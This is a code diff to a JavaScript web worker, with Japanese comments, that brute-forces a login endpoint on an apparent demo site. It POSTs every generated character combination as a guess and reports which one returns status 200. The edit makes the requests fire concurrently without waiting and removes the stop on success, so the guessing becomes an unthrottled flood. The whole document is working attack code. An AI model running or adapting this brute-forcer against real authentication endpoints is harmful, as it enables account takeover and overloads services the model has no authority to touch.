@@ -5,16 +5,21 @@ self.addEventListener('message', async (event) => {
     while (true) {
         const combinations = generateCombinations(charset, length);
         for (let combo of combinations) {
-            const response = await fetch('https://hackingdemo.vercel.app/api/auth.js', {
+            // 非同期でリクエストを送信
+            fetch('https://hackingdemo.vercel.app/api/auth.js', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ input: combo })
+            })
+            .then(response => {
+                self.postMessage({ combo, status: response.status });
+                if (response.status === 200) {
+                    self.postMessage({ success: combo });
+                }
+            })
+            .catch(error => {
+                self.postMessage({ error: `Error: ${error}` });
             });
-            self.postMessage({ combo, status: response.status });
-            if (response.status === 200) {
-                self.postMessage({ success: combo });
-                return; // 成功した場合は終了
-            }
         }
         length++; // 次の長さに進む
     }
